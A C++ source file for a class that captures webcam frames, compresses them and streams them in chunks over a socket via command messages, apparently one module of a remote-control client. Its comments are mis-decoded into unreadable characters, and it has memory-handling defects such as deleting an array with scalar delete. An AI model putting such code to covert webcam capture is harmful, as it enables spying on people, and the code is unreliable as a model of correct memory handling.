#include "StdAfx.h"
#include "ViewVideo.h"

CViewVideo::CViewVideo(void)
{
//	m_bStop = false;
	m_pDataCompress = NULL;
}

CViewVideo::~CViewVideo(void)
{
}

//��ʼ������ͷ����
bool CViewVideo::VideoInit()
{
	bool bInit = true;
	if (!CVideoCap::IsWebCam())    //�豸�����ڻ�����ʹ��
	{
		printf("�豸�����ڻ�����ʹ��!\n");
		bInit = false;
	}

	if (!m_Cap.Initialize())   //�豸��ʼ��ʧ��
	{
		bInit = false;
	}
	return bInit;
}

// void CViewVideo::SendVideoInfo()  //ѭ��������������
// {
// 	while (!m_bStop)
// 	{
// 		SendViedoHeaderInfo();  //����λͼͷ����
// 		SendVideoData();        //��������
// 		m_dwLastSend = GetTickCount();
// 		if ((GetTickCount() - m_dwLastSend) < 100)
// 		{
// 			Sleep(30);
// 		}
// 		delete m_pDataCompress;
// 	}
// }

void CViewVideo::SendViedoHeaderInfo()
{
	DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5; //δѹ�������ݳ���
	DWORD lenthCompress = (lenthUncompress + 12) * 1.1;   //ѹ�������ݵĳ���

	VIDEODATA_S tagVideoData;
	memset(&tagVideoData, 0, sizeof(VIDEODATA_S));
	tagVideoData.bShow = false;
	tagVideoData.HeadSize = sizeof(BITMAPINFOHEADER);
	tagVideoData.Id = 0;   //λͼͷ
	tagVideoData.Size = lenthCompress;  //ѹ��������ݴ�С
	tagVideoData.dwExtend1 = lenthUncompress;  //ѹ��ǰ�����ݴ�С
	tagVideoData.dwExtend2 = lenthCompress;    //ѹ��������ݴ�С
	memcpy((char*)&tagVideoData.bmpinfo, (char*)m_Cap.m_lpbmi, sizeof(BITMAPINFO));

	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_VIDEO_VIEW;   //��������λͼͷ��Ϣ
	memcpy((char*)tagMsgInfo.context, (char*)&tagVideoData, sizeof(VIDEODATA_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CViewVideo::SendVideoData()
{
	MSGINFO_S tagMsgInfo;
	const int nBufSize = VIDEO_BUF_SIZE;

	VIDEODATA_S tagVideoData;
	memset(&tagVideoData, 0, sizeof(VIDEODATA_S));
	tagVideoData.Id = 1;  //��������
	
	DWORD lenthUncompress = m_Cap.m_lpbmi->bmiHeader.biSizeImage - 5; //δѹ�������ݳ���
	DWORD lenthCompress = (lenthUncompress + 12) * 1.1;   //ѹ�������ݵĳ���
	tagVideoData.dwExtend1 = lenthUncompress;        //δѹ�����ݳ���
	tagVideoData.dwExtend2 = lenthCompress;          //ѹ�������ݳ���

	m_pDataCompress = new BYTE [lenthCompress];   //����ѹ�������ݿ�ָ��
	 //ѹ������
	::compress(m_pDataCompress, &lenthCompress, (BYTE*)m_Cap.GetDIB(), lenthUncompress);

	int nCount = lenthCompress / nBufSize + 1;  //���͵Ĵ���
	if (0 == lenthCompress % nBufSize)
	{
		nCount = nCount - 1;
	}

	tagVideoData.bShow = false;  //��ʾͼ��
	UINT nBegin = 0, nEnd = nBufSize;

	for (int index = 0; index < nCount ; index++)  //ѭ������
	{
		memset(&tagVideoData.Data, 0, nBufSize); //��ʼ������
		memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
		tagMsgInfo.Msg_id = CMD_VIDEO_VIEW;

		nBegin = index * nBufSize;  //ÿ�ο�ʼ�������ݵ�λ��
		tagVideoData.Begin = nBegin;
		tagVideoData.Size  = 0;
		tagVideoData.HeadSize = 0;  //λͼͷ��СĬ��ֵΪ0

		if (index == nCount -1)  //���һ�η���
		{
			tagVideoData.bShow = true;  //��ʱ������ʾͼ����
			tagVideoData.Id = 2;
			tagVideoData.Size = lenthCompress;  //���ݵ��ܴ�С
			for (UINT i = nBegin, k = 0; i < lenthCompress; i++, k++)
			{
				tagVideoData.Data[k] = m_pDataCompress[i];
			}
		}
		else   //������һ��һ�鷢������
		{
			for (UINT i = nBegin, k = 0; k < nBufSize; i++, k++)
			{
				tagVideoData.Data[k] = m_pDataCompress[i];
			}
		}
		memcpy((char*)tagMsgInfo.context, (char*)&tagVideoData, sizeof(VIDEODATA_S));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	}
}

//�������
void CViewVideo::CleanData()
{
	if (NULL != m_pDataCompress)
	{
		delete m_pDataCompress;
		m_pDataCompress = NULL;
	}
}